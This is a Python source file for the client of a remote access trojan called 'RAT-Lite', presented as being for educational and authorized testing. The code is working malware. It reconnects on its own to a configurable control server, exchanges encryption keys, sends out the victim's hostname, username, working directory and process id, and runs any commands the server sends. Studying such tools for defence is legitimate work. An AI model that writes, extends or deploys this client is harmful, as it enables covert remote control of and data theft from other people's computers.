#!/usr/bin/env python3
"""
RAT-Lite Advanced Client
Asyncio-based client with encryption
Educational use only - Authorized testing only
"""

import asyncio
import json
import os
import sys
import platform
import getpass
import subprocess
import base64
from datetime import datetime
from pathlib import Path

from crypto_manager import CryptoManager
from command_executor import CommandExecutor

# Configuration - CHANGE THIS FOR YOUR LOCAL NETWORK
SERVER_HOST = "127.0.0.1"  # Server IP address
SERVER_PORT = 8443
RECONNECT_DELAY = 5  # seconds


class RATClient:
    def __init__(self):
        self.crypto = CryptoManager()
        self.executor = CommandExecutor()
        self.session_key = None
        
    def get_system_info(self) -> dict:
        return {
            'os': f"{platform.system()} {platform.release()}",
            'hostname': platform.node(),
            'user': getpass.getuser(),
            'python_version': platform.python_version(),
            'cwd': os.getcwd(),
            'pid': os.getpid()
        }
    
    async def connect(self):
        while True:
            try:
                reader, writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)
                print(f"[*] Connected to {SERVER_HOST}:{SERVER_PORT}")
                await self.handle_session(reader, writer)
            except ConnectionRefusedError:
                print(f"[-] Connection refused, retrying in {RECONNECT_DELAY}s...")
            except Exception as e:
                print(f"[-] Error: {e}, retrying in {RECONNECT_DELAY}s...")
            
            await asyncio.sleep(RECONNECT_DELAY)
    
    async def handle_session(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        try:
            # Key exchange
            await self._key_exchange(reader, writer)
            
            # Send system info
            sys_info = json.dumps(self.get_system_info())
            await self._send_encrypted(writer, sys_info)
            
            # Main loop
            while True:
                cmd_data = await self._receive_encrypted(reader)
                if not cmd_data:
                    break
                
                command = json.loads(cmd_data)
                print(f"[*] Received: {command['type']}")
                
                # Execute command
                result = await self.executor.execute(command)
                
                # Send response
                await self._send_encrypted(writer, json.dumps(result))
                
                if command['type'] == 'exit':
                    break
                    
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"[-] Session error: {e}")
        finally:
            writer.close()
            await writer.wait_closed()
    
    async def _key_exchange(self, reader, writer):
        """Receive server public key, send encrypted session key"""
        # Receive public key
        key_len = int.from_bytes(await reader.read(4), 'big')
        pub_key_pem = await reader.read(key_len)
        
        # Generate session key and encrypt with server public key
        self.session_key = os.urandom(32)
        encrypted_key = self.crypto.encrypt_rsa(self.session_key, pub_key_pem)
        
        writer.write(len(encrypted_key).to_bytes(4, 'big') + encrypted_key)
        await writer.drain()
        print("[*] Key exchange complete")
    
    async def _send_encrypted(self, writer, data: str):
        encrypted = self.crypto.encrypt_aes(data.encode(), self.session_key)
        writer.write(len(encrypted).to_bytes(4, 'big') + encrypted)
        await writer.drain()
    
    async def _receive_encrypted(self, reader) -> str:
        data_len = int.from_bytes(await reader.read(4), 'big')
        if not data_len:
            return ""
        encrypted = await reader.read(data_len)
        decrypted = self.crypto.decrypt_aes(encrypted, self.session_key)
        return decrypted.decode()


if __name__ == '__main__':
    client = RATClient()
    try:
        asyncio.run(client.connect())
    except KeyboardInterrupt:
        print("[*] Client shutting down...")